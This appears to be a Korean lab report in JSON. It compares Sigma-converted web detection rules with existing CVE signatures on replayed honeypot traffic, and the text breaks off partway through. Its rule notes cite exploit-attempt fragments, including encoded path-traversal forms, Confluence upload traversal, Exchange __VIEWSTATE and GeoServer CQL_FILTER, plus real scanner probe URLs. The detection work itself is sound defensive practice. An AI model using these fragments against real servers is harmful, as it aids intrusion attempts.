@@ -1,0 +1,5818 @@
+{
+ "date_utc": "2026-09-28",
+ "issue": 54,
+ "branch": "C (계약서 6장 리플레이 비교)",
+ "timezone": "UTC",
+ "lab_db": {
+  "container": "opsloop-lab54 (postgres:16-alpine · 127.0.0.1:55449 · 볼륨 없음 · --rm · 남겨 둠)",
+  "runner": "opsloop-lab54-py (python:3.12-slim · psycopg2-binary 2.9.13 · pyyaml 6.0.3 · --network container:opsloop-lab54 · 저장소 읽기 전용)",
+  "db_url": "postgresql://opsloop:<실험 DB 비밀번호>@127.0.0.1:55449/opsloop (러너 안에서는 127.0.0.1:5432)",
+  "dump": {
+   "file": "~/opsloop-backup/opsloop-20260928-0730.dump",
+   "sha256": "456fece85b46d2f50964951177ea804d90d5072089d8be6aa7e174f3983dc033",
+   "archive_created_utc": "2026-09-28 07:30:06",
+   "dumped_from": "16.15",
+   "globals": "~/opsloop-backup/opsloop-20260928-0730.globals.sql",
+   "globals_sha256": "c1bbfda5486b9844936d51fb33be80ef88108f0d7ef1b299aa02ae9cf7cdbce7",
+   "restore": "globals 의 CREATE ROLE · ALTER ROLE · GRANT 줄만(CREATE ROLE opsloop 제외 · PASSWORD 줄 0) → pg_restore -U opsloop -d opsloop --no-owner --exit-on-error rc=0 (13:44:47 ~ 13:44:49)",
+   "backup_log_match": "backup.log 복원 시험 events 137274 · verdicts 1028 · actions 167 · blocklist 26 과 같다"
+  },
+  "fingerprint_restored": {
+   "events": 137274,
+   "events_real": 137234,
+   "incidents": 1028,
+   "verdicts": 1028,
+   "actions": 167,
+   "blocklist": 26,
+   "sessions": 4547,
+   "detector_runs": 29940,
+   "decoy_request_real": 1023,
+   "nginx_request_real": 0,
+   "incident_key_md5": "455f9282e27aaa612fe336fdd7276e6e",
+   "unjudged": 0,
+   "events_min_ts": "2026-09-04 07:53:52.591615+00",
+   "events_max_ts": "2026-09-28 07:22:11.349431+00",
+   "incidents_by_version": {
+    "c1": 3,
+    "i1": 2,
+    "i2": 1,
+    "s1": 4,
+    "v1": 555,
+    "v2": 321,
+    "v3": 138,
+    "w1": 2,
+    "w2": 2
+   },
+   "rule_versions": "a1,c1,i1,i2,n1,s1,v1,v2,v3,w1,w2"
+  },
+  "fingerprint_final": {
+   "events": 137340,
+   "events_real": 137300,
+   "incidents": 1028,
+   "verdicts": 1028,
+   "actions": 167,
+   "blocklist": 26,
+   "sessions": 4547,
+   "detector_runs": 29944,
+   "decoy_request_real": 1023,
+   "nginx_request_real": 38,
+   "incident_key_md5": "455f9282e27aaa612fe336fdd7276e6e",
+   "unjudged": 0,
+   "events_max_ts": "2026-09-28 16:00:47+00",
+   "events_marked_normal49": 66,
+   "rule_versions": "a1,c1,i1,i2,n1,s1,sg1,v1,v2,v3,w1,w2",
+   "detector_runs_added": [
+    29972,
+    29973,
+    29974,
+    29975
+   ]
+  }
+ },
+ "rules": {
+  "sg1": {
+   "file": "detector/rules_sigma.json",
+   "sha256": "4dd02f1916ce6e4e61359e42ed9e6d22a95591f49e76a21b5fab0eb196b6e695",
+   "rule": "R107",
+   "sources": 10,
+   "signatures": 11,
+   "rule_versions_definition_equals_file": true
+  },
+  "c1": {
+   "file": "detector/rules_cve.json",
+   "sha256": "44723683e8068476171a7ef52922b4cd11b44c6ee08aef79e10c6c8d9e886143",
+   "R105_signatures": 8,
+   "R106_signatures": 5
+  },
+  "sgx": {
+   "file": "scratchpad sigma54/rules_sigma_lab.json (증거 폴더 사본)",
+   "sha256": "375941b9b5361437357e89107aa9fa6c7f6018dbaee8eeeb467a84ef9e878c27",
+   "regenerated_same": true,
+   "webserver_rules": 86,
+   "pure_rules": 70,
+   "converted_rules": 76,
+   "converted_pure": 70,
+   "converted_partial_nonpure": 6,
+   "not_converted": 10,
+   "signatures": 94,
+   "signatures_of_pure_70": 85
+  },
+  "detect_py_sha256": "504b3a7e71cae0c411a2e7bad90f8c4fe4778efba087c7d5753499bcde4114be",
+  "sigma_convert_py_sha256": "6c9942abecfd4a97096896ed2bc7b53252645cec3de1577c1122fe83c27c1243"
+ },
+ "runs": [
+  {
+   "id": 29972,
+   "rule_version": "c1",
+   "range": "전체",
+   "started_utc": "2026-09-28 13:48:40",
+   "signals": {
+    "R105": 25,
+    "R106": 0
+   },
+   "incidents_new": 0,
+   "incidents_total": {
+    "R105": 3,
+    "R106": 0
+   }
+  },
+  {
+   "id": 29973,
+   "rule_version": "sg1",
+   "range": "전체",
+   "started_utc": "2026-09-28 13:48:41",
+   "signals": {
+    "R107": 0
+   },
+   "incidents_new": 0,
+   "incidents_total": {
+    "R107": 0
+   }
+  },
+  {
+   "id": 29974,
+   "rule_version": "sg1",
+   "range": "2026-09-28 08:30 ~ 16:30 (정상 구간)",
+   "started_utc": "2026-09-28 13:50:46",
+   "signals": {
+    "R107": 0
+   },
+   "incidents_new": 0
+  },
+  {
+   "id": 29975,
+   "rule_version": "c1",
+   "range": "전체 (sg1 · 정상 시나리오 뒤)",
+   "started_utc": "2026-09-28 13:50:47",
+   "signals": {
+    "R105": 25,
+    "R106": 0
+   },
+   "incidents_new": 0
+  }
+ ],
+ "c1_unchanged": {
+  "before": "c1_snapshot_before.txt",
+  "after_sg1": "c1_snapshot_after_sg1.txt",
+  "final": "c1_snapshot_final.txt",
+  "c1_rows_same": true,
+  "all_incident_keys": {
+   "count": 1028,
+   "md5": "455f9282e27aaa612fe336fdd7276e6e",
+   "unchanged": true
+  },
+  "method": "c1 사건 3행의 (키 · last_ts · signal_count · session_count · md5(evidence) · severity) 를 c1 → sg1 → 정상 시나리오 → c1 전후로 글자 대조"
+ },
+ "request_rows": {
+  "total": 1061,
+  "real_unmarked": 1023,
+  "normal_marked": 38,
+  "by_sensor_real": {
+   "decoy": 1023
+  },
+  "sources_real": 195,
+  "status_real": {
+   "404": 687,
+   "302": 203,
+   "200": 130,
+   "405": 3
+  },
+  "method_real": {
+   "GET": 1012,
+   "OPTIONS": 4,
+   "CONNECT": 3,
+   "POST": 3,
+   "HEAD": 1
+  },
+  "urls_with_query_real": 0,
+  "urls_with_percent_real": 0
+ },
+ "decoy_status_structure": {
+  "by_status": {
+   "200": {
+    "requests": 130,
+    "urls": [
+     "/admin"
+    ]
+   },
+   "302": {
+    "requests": 203,
+    "urls": [
+     "/"
+    ]
+   },
+   "405": {
+    "requests": 3,
+    "urls": [
+     "/"
+    ]
+   },
+   "404": {
+    "requests": 687,
+    "distinct_urls": 319
+   }
+  },
+  "sg1_signatures_with_statuses": 4,
+  "sg1_rules_with_statuses": 3,
+  "sgx_signatures_with_statuses": 22,
+  "sgx_rules_with_statuses": 18,
+  "sgx_statuses_including_404": 0,
+  "note": "디코이는 / (302 · 405) 와 /admin (200) 밖의 모든 경로에 404 를 준다. 응답 코드 조건이 있는 서명(sg1 4개 · sgx 22개, 모두 404 를 받지 않는다)은 디코이에서 / · /admin 밖의 경로로는 원리상 맞지 않는다"
+ },
+ "sql_vs_python": {
+  "sg1 R107": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "sg1 R107 (statuses 뺌)": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "c1 R105": {
+   "same": true,
+   "sql_signals": 25,
+   "python_signals": 25
+  },
+  "c1 R106": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "sgx R107": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "sgx R107 (statuses 뺌)": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  }
+ },
+ "sql_vs_python_before_normal": {
+  "sg1 R107": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "sg1 R107 (statuses 뺌)": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "c1 R105": {
+   "same": true,
+   "sql_signals": 25,
+   "python_signals": 25
+  },
+  "c1 R106": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "sgx R107": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  },
+  "sgx R107 (statuses 뺌)": {
+   "same": true,
+   "sql_signals": 0,
+   "python_signals": 0
+  }
+ },
+ "selected": [
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-41773/web_cve_2021_41773_apache_path_traversal.yml",
+   "title": "CVE-2021-41773 Exploitation Attempt",
+   "sigma_id": "3007fec6-e761-4319-91af-e32e20ac43f5",
+   "signatures": [
+    "sg-cve-2021-41773-apache-path-traversal"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [
+    200,
+    301
+   ],
+   "methods": [],
+   "notes": [
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "원본은 퍼센트 인코딩된 꼴(.%2e · .%%32%65 · .%%%25%33)을 찾는다. 디코이 url 은 1회 디코딩된 경로라 한 번 인코딩한 요청(.%2e)은 ../ 로 남아 맞지 않고, web-01 은 루트를 넘는 경로를 400 으로 거절하며 url 을 비운다(c1 apache-path-traversal 의 source 와 같은 관찰)."
+   ],
+   "c1_pair": {
+    "rule": "R106",
+    "signature": "apache-path-traversal"
+   },
+   "c1_compare_to": {
+    "rule": "R106",
+    "signature": "apache-path-traversal"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 0,
+   "c1_pair_total_real": 0,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml",
+   "title": "Log4j RCE CVE-2021-44228 Generic",
+   "sigma_id": "5ea8faa8-db8b-45be-89b0-151b84c82702",
+   "signatures": [
+    "sg-cve-2021-44228-log4j"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [],
+   "notes": [
+    "keywords(로그 줄 전체에서 찾는 값)를 요청 url 에만 댔다. 헤더 · 본문 · 다른 필드에 든 값은 보지 않는다(좁아짐).",
+    "원본 tags 에 CVE 가 없어 cves 를 비웠다.",
+    "Log4Shell 시도는 대부분 헤더 · 본문으로 들어오는데 우리는 요청 url 만 저장해 그 시도는 보이지 않는다(c1 log4shell-in-path 와 같은 한계)."
+   ],
+   "c1_pair": {
+    "rule": "R106",
+    "signature": "log4shell-in-path"
+   },
+   "c1_compare_to": {
+    "rule": "R106",
+    "signature": "log4shell-in-path"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 0,
+   "c1_pair_total_real": 0,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-3398/web_cve_2019_3398_confluence.yml",
+   "title": "Confluence Exploitation CVE-2019-3398",
+   "sigma_id": "e9bc39ae-978a-4e49-91ab-5bd481fc668b",
+   "signatures": [
+    "sg-cve-2019-3398-confluence"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [
+    "POST"
+   ],
+   "notes": [
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "filename=../../../../ 는 업로드 요청의 질의 값이다. 디코이 url 에는 질의가 없어 web-01 요청에서만 보인다."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "confluence"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "confluence"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 2,
+   "c1_pair_total_real": 2,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/confluence/rest/applinks/1.0/manifest",
+     "status": 404,
+     "count": 2
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-22518/web_exploit_cve_2023_22518_confluence_auth_bypass.yml",
+   "title": "CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Webserver)",
+   "sigma_id": "a902d249-9b9c-4dc4-8fd0-fbe528ef965c",
+   "signatures": [
+    "sg-exploit-cve-2023-22518-confluence"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [
+    200,
+    302,
+    405
+   ],
+   "methods": [
+    "POST"
+   ],
+   "notes": [
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐)."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "confluence"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "confluence"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 2,
+   "c1_pair_total_real": 2,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/confluence/rest/applinks/1.0/manifest",
+     "status": 404,
+     "count": 2
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2020/Exploits/CVE-2020-0688/web_cve_2020_0688_msexchange.yml",
+   "title": "CVE-2020-0688 Exchange Exploitation via Web Log",
+   "sigma_id": "fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5",
+   "signatures": [
+    "sg-cve-2020-0688-msexchange"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [
+    "GET"
+   ],
+   "notes": [
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "__VIEWSTATE= 는 질의 값이다. 디코이 url 에는 질의가 없어 web-01 요청에서만 보인다."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "exchange-owa"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "exchange-owa"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 4,
+   "c1_pair_total_real": 4,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/owa/",
+     "status": 404,
+     "count": 4
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell.yml",
+   "title": "Exchange ProxyShell Pattern",
+   "sigma_id": "23eee45e-933b-49f9-ae1b-df706d2d52ef",
+   "signatures": [
+    "sg-exchange-proxyshell-1",
+    "sg-exchange-proxyshell-2"
+   ],
+   "converted": true,
+   "branches": 2,
+   "statuses": [
+    401
+   ],
+   "methods": [],
+   "notes": [
+    "원본 condition 'all of selection_1* or selection_poc' 을 논리합 표준형으로 편 갈래 2개 가운데 1번째다.",
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "원본 tags 에 CVE 가 없어 cves 를 비웠다.",
+    "값의 ? 는 Sigma 와일드카드라 아무 글자 하나로 옮겼다. 원본이 질의 문자열의 ? 를 뜻했다면 다른 글자에도 맞는다(넓어짐).",
+    "원본 condition 'all of selection_1* or selection_poc' 을 논리합 표준형으로 편 갈래 2개 가운데 2번째다.",
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "원본 tags 에 CVE 가 없어 cves 를 비웠다."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "exchange-owa"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "exchange-owa"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 4,
+   "c1_pair_total_real": 4,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/owa/",
+     "status": 404,
+     "count": 4
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2023/Exploits/CVE-2023-25157/web_cve_2023_25157_geoserver_sql_injection.yml",
+   "title": "Potential CVE-2023-25157 Exploitation Attempt",
+   "sigma_id": "c0341543-5ed0-4475-aabc-7eea8c52aa66",
+   "signatures": [
+    "sg-cve-2023-25157-geoserver-sql"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [
+    "GET"
+   ],
+   "notes": [
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "CQL_FILTER= 와 SQL 조각은 질의 값이다. 디코이 url 에는 질의가 없어 web-01 요청에서만 보인다."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "geoserver"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "geoserver"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 9,
+   "c1_pair_total_real": 9,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/geoserver/web/",
+     "status": 404,
+     "count": 3
+    },
+    {
+     "method": "GET",
+     "url": "/geoserver/",
+     "status": 404,
+     "count": 2
+    },
+    {
+     "method": "GET",
+     "url": "/geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage",
+     "status": 404,
+     "count": 2
+    },
+    {
+     "method": "GET",
+     "url": "/geoserver/index.html",
+     "status": 404,
+     "count": 2
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2019/Exploits/CVE-2019-11510/web_cve_2019_11510_pulsesecure_exploit.yml",
+   "title": "Pulse Secure Attack CVE-2019-11510",
+   "sigma_id": "2dbc10d7-a797-49a8-8776-49efa6442e60",
+   "signatures": [
+    "sg-cve-2019-11510-pulsesecure-exploit"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [],
+   "notes": [
+    "값의 ? 는 Sigma 와일드카드라 아무 글자 하나로 옮겼다. 원본이 질의 문자열의 ? 를 뜻했다면 다른 글자에도 맞는다(넓어짐).",
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "원본 값 *?/dana/html5acc/guacamole/* 의 ? 는 공개 PoC(exploit-db 47297)에서 질의 문자열의 시작이다. 와일드카드로 옮겨 경로 안의 /dana/html5acc/guacamole/ 에도 맞는다."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "ivanti-connect-secure"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "ivanti-connect-secure"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 2,
+   "c1_pair_total_real": 2,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/dana-na/nc/nc_gina_ver.txt",
+     "status": 404,
+     "count": 2
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules-emerging-threats/2021/Exploits/CVE-2021-22893/web_cve_2021_22893_pulse_secure_rce_exploit.yml",
+   "title": "Pulse Connect Secure RCE Attack CVE-2021-22893",
+   "sigma_id": "5525edac-f599-4bfd-b926-3fa69860e766",
+   "signatures": [
+    "sg-cve-2021-22893-pulse-secure-rce"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [],
+   "notes": [
+    "값의 ? 는 Sigma 와일드카드라 아무 글자 하나로 옮겼다. 원본이 질의 문자열의 ? 를 뜻했다면 다른 글자에도 맞는다(넓어짐).",
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "?id= · ?token= 는 질의 조건이라 디코이 url(질의 없음)에는 맞지 않는다. 나머지 낱말(meeting · smb · metric 등)은 경로에서도 맞는다."
+   ],
+   "c1_pair": {
+    "rule": "R105",
+    "signature": "ivanti-connect-secure"
+   },
+   "c1_compare_to": {
+    "rule": "R105",
+    "signature": "ivanti-connect-secure"
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 2,
+   "c1_pair_total_real": 2,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [
+    {
+     "method": "GET",
+     "url": "/dana-na/nc/nc_gina_ver.txt",
+     "status": 404,
+     "count": 2
+    }
+   ],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  },
+  {
+   "path": "rules/web/webserver_generic/web_path_traversal_exploitation_attempt.yml",
+   "title": "Path Traversal Exploitation Attempts",
+   "sigma_id": "7745c2ea-24a5-4290-b680-04359cb84b35",
+   "signatures": [
+    "sg-path-traversal-exploitation-attempt"
+   ],
+   "converted": true,
+   "branches": 1,
+   "statuses": [],
+   "methods": [],
+   "notes": [
+    "원본 필드 cs-uri-query 를 요청 url(경로와 질의가 한 값) 하나에 댔다. 경로 · 질의 구분을 잃어 한쪽 조건이 다른 쪽에서도 맞을 수 있다(넓어짐).",
+    "원본 tags 에 CVE 가 없어 cves 를 비웠다.",
+    "제품과 무관한 일반 규칙이라 자산 조건(asset_match)을 두지 않는다. 퍼센트 인코딩된 꼴(%252f · %c0%af 등)은 디코이 url 에서 한 번 풀려 원형이 남지 않는다."
+   ],
+   "c1_pair": null,
+   "c1_compare_to": {
+    "rule": "R106",
+    "signature": "apache-path-traversal",
+    "reference_only": true
+   },
+   "real": {
+    "requests": 0,
+    "by_sensor": {},
+    "sources": 0,
+    "first_ts": null,
+    "last_ts": null
+   },
+   "also_c1_pair": 0,
+   "also_c1_any": 0,
+   "also_c1_by_rule": {
+    "R105": 0,
+    "R106": 0
+   },
+   "sigma_only": 0,
+   "c1_pair_only": 0,
+   "c1_pair_total_real": 0,
+   "status_excluded": 0,
+   "status_excluded_status": {},
+   "status_excluded_urls": [],
+   "urls": [],
+   "c1_pair_only_urls": [],
+   "normal_marked": 0,
+   "normal_marked_scenarios": [],
+   "normal_marked_no_status": 0
+  }
+ ],
+ "sg1_union": {
+  "requests": 0,
+  "by_sensor": {},
+  "sources": 0,
+  "first_ts": null,
+  "last_ts": null,
+  "also_c1_any": 0,
+  "sigma_only": 0,
+  "c1_any_total_real": 25,
+  "c1_only_vs_sg1": 25,
+  "status_excluded": 0,
+  "normal_marked": 0
+ },
+ "sg1_stages": {
+  "sg-cve-2021-41773-apache-path-traversal": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+statuses",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-cve-2021-44228-log4j": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+not_patterns",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-cve-2019-3398-confluence": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+all_patterns",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+methods",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-exploit-cve-2023-22518-confluence": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+methods",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+statuses",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-cve-2020-0688-msexchange": [
+   {
+    "stage": "pattern",
+    "real": 4,
+    "normal_marked": 0,
+    "urls": [
+     {
+      "method": "GET",
+      "url": "/owa/",
+      "status": 404,
+      "count": 4
+     }
+    ]
+   },
+   {
+    "stage": "+all_patterns",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+methods",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-exchange-proxyshell-1": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+all_patterns",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+statuses",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-exchange-proxyshell-2": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+statuses",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-cve-2023-25157-geoserver-sql": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+all_patterns",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   },
+   {
+    "stage": "+methods",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-cve-2019-11510-pulsesecure-exploit": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-cve-2021-22893-pulse-secure-rce": [
+   {
+    "stage": "pattern",
+    "real": 2,
+    "normal_marked": 0,
+    "urls": [
+     {
+      "method": "GET",
+      "url": "/dana-cached/hc/HostCheckerInstaller.osx",
+      "status": 404,
+      "count": 2
+     }
+    ]
+   },
+   {
+    "stage": "+all_patterns",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ],
+  "sg-path-traversal-exploitation-attempt": [
+   {
+    "stage": "pattern",
+    "real": 0,
+    "normal_marked": 0,
+    "urls": []
+   }
+  ]
+ },
+ "c1_signatures": [
+  {
+   "rule": "R105",
+   "signature": "confluence",
+   "requests": 2,
+   "by_sensor": {
+    "decoy": 2
+   },
